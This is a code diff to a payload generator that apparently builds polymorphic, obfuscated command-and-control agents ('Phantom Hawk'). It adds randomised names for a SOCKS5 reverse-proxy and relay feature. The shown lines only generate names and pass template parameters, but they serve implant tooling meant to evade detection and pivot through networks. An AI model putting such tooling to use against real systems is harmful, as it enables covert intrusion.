@@ -281,6 +281,17 @@ class PayloadGenerator:
 
         v_coffloader_b64 = poly.generate_random_name('coffloader_b64_')
 
+        # Reverse proxy variables
+        v_reverse_proxy_active = poly.generate_random_name('reverse_proxy_active_')
+        v_reverse_proxy_stop_event = poly.generate_random_name('reverse_proxy_stop_event_')
+        v_reverse_proxy_thread = poly.generate_random_name('reverse_proxy_thread_')
+
+        # Reverse proxy method names
+        m_start_reverse_proxy = poly.generate_random_name('start_reverse_proxy_')
+        m_stop_reverse_proxy = poly.generate_random_name('stop_reverse_proxy_')
+        m_handle_socks5 = poly.generate_random_name('handle_socks5_')
+        m_relay_data = poly.generate_random_name('relay_data_')
+
         if obfuscate:
             register_uri_code = poly.obfuscate_string(register_uri)
             tasks_uri_code = poly.obfuscate_string(tasks_uri)
@@ -411,7 +422,14 @@ class PayloadGenerator:
             redirector_port=redirector_port,
             use_redirector=str(use_redirector).lower().capitalize(),
             use_failover=str(use_failover).lower().capitalize(),
-            failover_urls=failover_urls
+            failover_urls=failover_urls,
+            v_reverse_proxy_active=v_reverse_proxy_active,
+            v_reverse_proxy_stop_event=v_reverse_proxy_stop_event,
+            v_reverse_proxy_thread=v_reverse_proxy_thread,
+            m_start_reverse_proxy=m_start_reverse_proxy,
+            m_stop_reverse_proxy=m_stop_reverse_proxy,
+            m_handle_socks5=m_handle_socks5,
+            m_relay_data=m_relay_data
         )
 
         print(f"[+] POLYMORPHIC Phantom Hawk agent generated (Class: {class_name})")
